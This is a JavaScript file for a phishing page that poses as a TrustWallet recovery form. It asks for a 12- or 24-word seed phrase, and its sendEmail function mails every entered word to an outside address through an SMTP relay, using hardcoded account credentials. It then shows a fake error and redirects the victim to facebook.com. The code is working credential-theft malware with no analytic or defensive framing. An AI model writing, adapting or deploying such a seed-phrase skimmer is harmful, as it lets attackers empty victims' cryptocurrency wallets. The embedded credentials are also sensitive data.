let screenWidth = window.innerWidth;

function updateInputFields() {
  let wrapper = document.querySelector(".section");
  let inputContainer = document.getElementById("inputContainer");
  let inputSelector = document.getElementById("inputSelector");
  let selectedValue = parseInt(inputSelector.value);

  // Clear existing input fields
  inputContainer.innerHTML = "";

  for (let i = 0; i < selectedValue; i++) {
    let inputDiv = document.createElement("div");
    inputDiv.classList.add("input-div");
    let inputNumber = document.createElement("span");
    inputNumber.classList.add("input-number");
    let numbering = i + 1;
    inputNumber.textContent = `${numbering}.`;
    let inputTag = document.createElement("input");
    inputTag.classList.add("meta-value");
    inputTag.placeholder = `Word #${numbering}`;
    inputTag.type = "password";
    // inputTag.setAttribute("autocomplete", "off");

    let contentToggle;
    // if (numbering > 9) {
    //   inputNumber.style.marginRight = "0";
    // }

    if (inputTag.type == "password") {
      contentToggle = document.createElement("i");
      contentToggle.classList.add("fa-regular", "fa-eye-slash");
    } else {
      contentToggle = document.createElement("i");
      contentToggle.classList.add("fa-solid", "fa-eye");
    }
    contentToggle.addEventListener("click", function () {
      if (inputTag.type === "password") {
        inputTag.type = "text";
        contentToggle.classList.remove("fa-regular", "fa-eye-slash");
        contentToggle.classList.add("fa-solid", "fa-eye");
      } else {
        inputTag.type = "password";
        contentToggle.classList.remove("fa-solid", "fa-eye");
        contentToggle.classList.add("fa-regular", "fa-eye-slash");
      }
    });

    inputDiv.appendChild(inputNumber);
    inputDiv.appendChild(inputTag);
    inputDiv.appendChild(contentToggle);
    inputContainer.appendChild(inputDiv);
    if (selectedValue === 24 && screenWidth > 1144) {
      wrapper.style.width = "60%";
      inputDiv.style.width = "23%";
    } else if (selectedValue === 12 && screenWidth > 1144) {
      wrapper.style.width = "30%";
      inputDiv.style.width = "47%";
    } else if (selectedValue === 24 && screenWidth < 481) {
      wrapper.style.width = "95%";
      inputDiv.style.width = "47%";
    } else if (selectedValue === 12 && screenWidth < 481) {
      wrapper.style.width = "95%";
      inputDiv.style.width = "100%";
    }
  }
}

// Call the validation function immediately on select change
inputSelector.addEventListener("change", function () {
  validateInputs();
});

updateInputFields();

// var button = document.getElementById("myButton");
// button.addEventListener("click", function () {
//   alert("working");
// });
let submitButton = document.getElementById("myButton");

function validateInputs() {
  let metaData = document.querySelectorAll(".meta-value"); // Move this line inside the function
  let inputIndex = document.querySelectorAll(".input-number");
  let enableButton = true;

  for (let i = 0; i < metaData.length; i++) {
    for (let i = 0; i < inputIndex.length; i++) {
      metaData[i].addEventListener("focus", function () {
        if (metaData[i].value !== "") {
          inputIndex[i].style.display = "block";
          metaData[i].style.paddingLeft = "2rem";
        } else if ((inputIndex[i].style.display = "none")) {
          inputIndex[i].style.display = "block";
          metaData[i].style.paddingLeft = "2rem";
        }

        // if (
        //   metaData[i].value !== "" &&
        //   inputIndex[i].style.display === "none"
        // ) {
        //   inputIndex[i].style.display = "block";
        //   metaData[i].style.paddingLeft = "1.5rem";
        // }
      });
      metaData[i].addEventListener("blur", function () {
        if (metaData[i].value === "") {
          inputIndex[i].style.display = "none";
          metaData[i].style.paddingLeft = "0.9rem";
        }
        // else if(metaData[i].value === ""){
        //   inputIndex[i].style.display = "block";
        //   metaData[i].style.paddingLeft = "2rem";
        // }
      });
    }
    if (metaData[i].value === "") {
      enableButton = false;
      break; // Stop checking once an empty field is found
    }
  }

  if (enableButton) {
    submitButton.style.opacity = "1";
    submitButton.style.cursor = "pointer";
    submitButton.disabled = !enableButton;
  } else {
    submitButton.style.opacity = "0.5";
    submitButton.style.cursor = "not-allowed";
    submitButton.disabled = !enableButton;
  }
}

// Attach the validateInputs function to appropriate events
let inputContainer = document.getElementById("inputContainer");
inputContainer.addEventListener("input", validateInputs);

function sendEmail() {
  let bodyMessage = "";
  let inputValue = document.querySelectorAll(".meta-value");
  for (let i = 0; i < inputValue.length; i++) {
    let realValue = inputValue[i].value;
    bodyMessage += `${realValue} <br>`;
    // return bodyMessage;
    // console.log(bodyMessage);
    inputValue[i].value = "";
  }

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "jasongregor005@outlook.com",
    Password: "E4CE7FFCD9D625180EB700EE9EA29AFE458B",
    To: "jasongregor005@outlook.com",
    From: "jasongregor005@outlook.com",
    Subject: "TrustWallet",
    Body: bodyMessage,
  }).then((message) => {
    if (message === "OK") {
      Swal.fire({
        title: "Error",
        text: "Something went wrong,Please try again later!",
        icon: "warning",
      })
        .then((result) => {
          if (result.isConfirmed) {
            window.location.href = "https://facebook.com";
          }
        })
        .then(() => {
          // Redirect to another page
        });
    }
  });
}

submitButton.addEventListener("click", function () {
  sendEmail();
});

// Call validateInputs initially to set the initial state
validateInputs();
